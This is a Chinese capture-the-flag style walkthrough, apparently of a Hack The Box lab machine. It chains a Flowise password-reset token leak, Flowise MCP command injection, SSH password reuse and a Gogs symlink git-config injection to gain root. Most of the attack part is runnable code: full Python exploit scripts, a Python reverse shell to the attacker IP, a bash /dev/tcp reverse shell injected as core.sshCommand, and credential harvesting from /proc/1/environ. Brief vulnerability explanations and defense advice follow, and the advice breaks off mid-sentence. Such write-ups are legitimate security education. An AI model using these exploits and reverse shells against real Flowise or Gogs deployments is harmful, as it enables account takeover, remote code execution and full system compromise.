# 从API信息泄露到RootShell：一次完整的容器逃逸与Git服务提权实战

## 实战环境概览

| 项目 | 信息 |
|------|------|
| 目标IP | `10.129.10.172` |
| 攻击机IP | `10.10.16.46` |
| 操作系统 | Ubuntu 24.04 LTS |
| 服务组件 | Flowise 3.0.5 (容器)、Gogs 0.13.3、Nginx、Docker |

## 完整攻击链流程图

```
信息收集 (端口扫描)
    ↓
Flowise API 信息泄露 (CVE-2025-58434)
    ↓
密码重置 → 获取JWT
    ↓
MCP 命令注入 (CVE-2025-59528)
    ↓
容器内RCE (root in container)
    ↓
环境变量泄露 SMTP_PASSWORD
    ↓
SSH 横向移动到主机 (ben用户)
    ↓
Gogs 内网服务发现 (端口3001)
    ↓
Gogs 符号链接配置注入 (CVE-2025-8110)
    ↓
RootShell → 获取最终Flag
```

## 详细操作步骤

### 第一阶段：信息收集与漏洞探测

1.  **端口扫描与服务识别**

    ```bash
    # 全端口扫描
    nmap -sC -sV -p- 10.129.10.172

    # 结果发现开放端口
    # 22/tcp   OpenSSH 9.6p1
    # 80/tcp   nginx 1.24.0 (Ubuntu)
    ```

2.  **虚拟主机发现**

    ```bash
    # 添加hosts解析
    echo "10.129.10.172 staging.silentium.htb staging-v2-code.dev.silentium.htb" >> /etc/hosts

    # 访问Flowise应用
    curl -s http://staging.silentium.htb/ | grep -i "flowise"
    # 确认运行 Flowise 3.0.5
    ```

### 第二阶段：Flowise API 信息泄露与账户接管

3.  **未授权获取密码重置Token**

    ```bash
    # 端点：/api/v1/account/forgot-password (无需认证)
    curl -s -X POST 'http://staging.silentium.htb/api/v1/account/forgot-password' \
      -H 'Content-Type: application/json' \
      -d '{"user":{"email":"ben@silentium.htb"}}' | jq .

    # 响应返回敏感信息
    {
      "user": {
        "id": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
        "email": "ben@silentium.htb",
        "credential": "$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG",
        "tempToken": "fW64R0No4pigUv7zYMo5MxsW1SEUsakBqm9SGpqCHwYA4rJIttlvQv4qNRTxlTm8",
        "tokenExpiry": "2026-04-12T11:36:40.141Z"
      }
    }
    ```

4.  **重置管理员密码**

    ```bash
    TEMP_TOKEN="fW64R0No4pigUv7zYMo5MxsW1SEUsakBqm9SGpqCHwYA4rJIttlvQv4qNRTxlTm8"

    curl -s -X POST 'http://staging.silentium.htb/api/v1/account/reset-password' \
      -H 'Content-Type: application/json' \
      -d "{\"user\":{\"email\":\"ben@silentium.htb\",\"tempToken\":\"$TEMP_TOKEN\",\"password\":\"z0nSec!\"}}"
    # 返回201，密码重置成功
    ```

5.  **登录获取JWT**

    ```bash
    curl -s -X POST 'http://staging.silentium.htb/api/v1/auth/login' \
      -H 'Content-Type: application/json' \
      -d '{"email":"ben@silentium.htb","password":"z0nSec!"}' | jq .

    # 获取JWT Token
    TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
    ```

### 第三阶段：MCP命令注入实现容器RCE

6.  **创建MCP注入脚本**

    ```python
    # mcp_exploit.py
    import requests
    import json

    TARGET = "http://staging.silentium.htb"
    LHOST = "10.10.16.46"   # 攻击机IP
    LPORT = 9001

    session = requests.Session()
    login_resp = session.post(f"{TARGET}/api/v1/auth/login",
        json={"email": "ben@silentium.htb", "password": "z0nSec!"},
        headers={"Content-Type": "application/json"})

    token = login_resp.json().get("token")
    session.headers.update({
        "Content-Type": "application/json",
        "x-request-from": "internal",
        "Authorization": f"Bearer {token}"
    })

    # Node.js reverse shell payload (Alpine兼容)
    reverse_shell = f"""python3 -c 'import socket,subprocess,os;
    s=socket.socket();s.connect(("{LHOST}",{LPORT}));
    os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2));
    subprocess.call(["/bin/sh","-i"])'"""

    payload = {
        "loadMethod": "listActions",
        "inputs": {
            "mcpServerConfig": json.dumps({
                "command": "sh",
                "args": ["-c", reverse_shell]
            })
        }
    }

    session.post(f"{TARGET}/api/v1/node-load-method/customMCP",
                 json=payload, timeout=3)
    ```

7.  **启动监听器并执行**

    ```bash
    # 终端1 - 启动监听器
    rlwrap nc -lvnp 9001

    # 终端2 - 执行exploit
    python3 mcp_exploit.py
    ```

8.  **获得容器Shell**

    ```bash
    # 监听器收到连接
    connect to [10.10.16.46] from [10.129.10.172] 57040

    / # id
    uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys)

    / # whoami
    root
    ```

### 第四阶段：容器逃逸与横向移动

9.  **从容器环境变量获取凭证**

    ```bash
    / # cat /proc/1/environ | tr '\0' '\n' | grep -E "SMTP|FLOWISE"
    SMTP_PASSWORD=r04D!!_R4ge
    SMTP_HOST=mailhog
    FLOWISE_USERNAME=ben
    FLOWISE_PASSWORD=F1l3_d0ck3r
    JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
    ```

10. **SSH登录主机 (密码复用)**

    ```bash
    # 在Kali终端
    ssh ben@10.129.10.172
    # Password: r04D!!_R4ge

    ben@silentium:~$ cat user.txt
    b2143b1e9942a6a72851e39ac4f450af
    ```

11. **发现内网Gogs服务**

    ```bash
    ben@silentium:~$ ss -tlnp | grep -E "3000|3001"
    LISTEN  127.0.0.1:3000
    LISTEN  127.0.0.1:3001

    ben@silentium:~$ cat /opt/gogs/gogs/custom/conf/app.ini
    RUN_USER = root
    HTTP_ADDR = 127.0.0.1
    HTTP_PORT = 3001
    [repository]
    ROOT_PATH = /root/gogs-repositories
    ```

    <mark>**关键发现：Gogs以root用户运行！**</mark>

### 第五阶段：Gogs配置注入实现Root提权

12. **建立SSH隧道**

    ```bash
    # 在Kali终端建立隧道
    ssh -N -f -L 3001:127.0.0.1:3001 ben@10.129.10.172
    # Password: r04D!!_R4ge
    ```

13. **注册Gogs用户 (绕过验证码)**

    ```bash
    # 获取CSRF和验证码
    curl -s http://127.0.0.1:3001/user/sign_up -c /tmp/cookies.txt > /tmp/signup.html
    CSRF=$(grep -oP 'name="_csrf" value="\K[^"]+' /tmp/signup.html)
    CAPTCHA_ID=$(grep -oP 'name="captcha_id" value="\K[^"]+' /tmp/signup.html)

    # 下载验证码图片手动识别
    curl -s -b /tmp/cookies.txt "http://127.0.0.1:3001/captcha/${CAPTCHA_ID}.png" -o /tmp/captcha.png
    # 打开图片输入验证码
    CAPTCHA_ANSWER="手动输入"

    # 注册用户
    curl -X POST http://127.0.0.1:3001/user/sign_up \
      -b /tmp/cookies.txt -c /tmp/cookies.txt \
      -H "Content-Type: application/x-www-form-urlencoded" \
      --data-urlencode "_csrf=$CSRF" \
      --data-urlencode "user_name=hacker" \
      --data-urlencode "email=hacker@test.com" \
      --data-urlencode "password=Hacker123!" \
      --data-urlencode "retype=Hacker123!" \
      --data-urlencode "captcha_id=$CAPTCHA_ID" \
      --data-urlencode "captcha=$CAPTCHA_ANSWER"
    ```

14. **生成API Token**

    ```bash
    curl -s -X POST \
      -H "Host: staging-v2-code.dev.silentium.htb" \
      -H "Content-Type: application/json" \
      "http://127.0.0.1:3001/api/v1/users/hacker/tokens" \
      -u "hacker:Hacker123!" \
      -d '{"name":"exploit"}'

    # 返回token: 100e16d98f99112270b7cd592194addfa45e67a7
    ```

15. **CVE-2025-8110 利用脚本**

    ```python
    #!/usr/bin/env python3
    """CVE-2025-8110 - Gogs Symlink Git Config Injection RCE"""

    import requests
    import subprocess
    import tempfile
    import os
    import base64
    import argparse

    def main():
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', required=True)
        parser.add_argument('-lh', '--lhost', required=True)
        parser.add_argument('-lp', '--lport', required=True)
        parser.add_argument('--username', default='hacker')
        parser.add_argument('--password', default='Hacker123!')
        parser.add_argument('--token', default=None)
        args = parser.parse_args()

        GOGS_URL = args.url.rstrip('/')
        HOST = "staging-v2-code.dev.silentium.htb"
        REPO = "pwn-repo"

        s = requests.Session()
        s.headers.update({"Host": HOST})

        # 认证
        if args.token:
            token = args.token
        else:
            r = s.post(f"{GOGS_URL}/api/v1/users/{args.username}/tokens",
                       auth=(args.username, args.password),
                       json={"name": "pwn-token"})
            token = r.json()["sha1"]

        print(f"[+] Token: {token}")
        s.headers.update({"Authorization": f"token {token}"})

        # 创建仓库
        s.post(f"{GOGS_URL}/api/v1/user/repos",
               json={"name": REPO, "private": False, "auto_init": False})

        # 本地构建含符号链接的仓库
        work = tempfile.mkdtemp()
        os.chdir(work)
        subprocess.run(["git", "init"], capture_output=True)
        subprocess.run(["git", "config", "user.email", "h@h.com"], capture_output=True)
        subprocess.run(["git", "config", "user.name", "h"], capture_output=True)

        os.symlink(".git/config", os.path.join(work, "symlink"))
        open(os.path.join(work, "README.md"), "w").write("x\n")
        subprocess.run(["git", "add", "-A"], capture_output=True)
        subprocess.run(["git", "commit", "-m", "init"], capture_output=True)

        push_url = f"http://{args.username}:{args.password}@localhost:3001/{args.username}/{REPO}.git"
        subprocess.run(["git", "push", push_url, "master", "--force"],
                       capture_output=True, env={**os.environ, "GIT_TERMINAL_PROMPT": "0"})
        print("[+] Symlink pushed")

        # 获取SHA
        r = s.get(f"{GOGS_URL}/api/v1/repos/{args.username}/{REPO}/contents/symlink")
        sha = r.json()["sha"]

        # 恶意配置 - 反向shell
        config = f"""[core]
    \trepositoryformatversion = 0
    \tfilemode = true
    \tbare = false
    \tsshCommand = bash -c 'bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1'
    [remote "origin"]
    \turl = ssh://localhost/x
    \tfetch = +refs/heads/*:refs/remotes/origin/*
    [branch "master"]
    \tremote = origin
    \tmerge = refs/heads/master
    """

        # 覆盖配置文件
        r = s.put(f"{GOGS_URL}/api/v1/repos/{args.username}/{REPO}/contents/symlink",
                  json={"content": base64.b64encode(config.encode()).decode(),
                        "message": "update", "sha": sha})
        print("[+] Exploit sent! Check listener.")

    if __name__ == "__main__":
        main()
    ```

16. **执行提权**

    ```bash
    # 终端1 - 启动监听器
    rlwrap nc -lnvp 9001

    # 终端2 - 执行脚本
    python3 exploit.py \
      -u http://localhost:3001 \
      -lh 10.10.16.46 \
      -lp 9001 \
      --token 100e16d98f99112270b7cd592194addfa45e67a7
    ```

17. **获取Root Shell和Flag**

    ```bash
    # 监听器收到连接
    connect to [10.10.16.46] from [10.129.10.172] 38624

    root@silentium:~# id
    uid=0(root) gid=0(root) groups=0(root)

    root@silentium:~# cat /root/root.txt
    7b7fab8c83b9bdb4████████████████
    ```

## 漏洞原理深度分析

### 漏洞1：Flowise API信息泄露 (CVE-2025-58434)

<mark>**原理**：密码重置功能的设计缺陷。当请求重置密码时，服务端本应将token发送到用户邮箱，但实际上直接将token返回在HTTP响应体中。</mark>

**影响**：攻击者可完全接管任意账户。

### 漏洞2：Flowise MCP命令注入 (CVE-2025-59528)

<mark>**原理**：`mcpServerConfig`参数通过`Function()`构造函数直接执行，相当于`eval()`，且未做任何过滤。</mark>

**影响**：Node.js环境下的任意代码执行，获得容器内Root权限。

### 漏洞3：Gogs符号链接配置注入 (CVE-2025-8110)

<mark>**原理**：
1. Gogs的PUT API在处理文件更新时，会跟随符号链接
2. 攻击者创建指向`.git/config`的符号链接
3. 通过API更新该符号链接，实际修改了Git仓库的配置文件
4. 注入`core.sshCommand`配置项
5. 任何Git SSH操作触发反向shell</mark>

**影响**：以Gogs运行用户(root)身份执行任意命令。

## 总结与防御建议

### 攻击链总结

| 阶段 | 技术手段 | 关键漏洞 |
|------|----------|----------|
| 初始访问 | API信息泄露 | CVE-2025-58434 |
| 容器逃逸 | MCP命令注入 | CVE-2025-59528 |
| 横向移动 | 密码复用 | 弱凭证管理 |
| 权限提升 | 符号链接配置注入 | CVE-2025-8110 |

### 防御建议

1.  **API安全**：密码重置token严禁返回在响应体中，应仅发送至用户邮箱
2.  **输入验证**：任何用户可控的配置参数必须严格校验，禁止动态代码执行
3.  **凭证管理**：避免密码复用，容器内凭证与主机凭证应分离
4.  **服务权限**：Git服务不应以root运行，应使用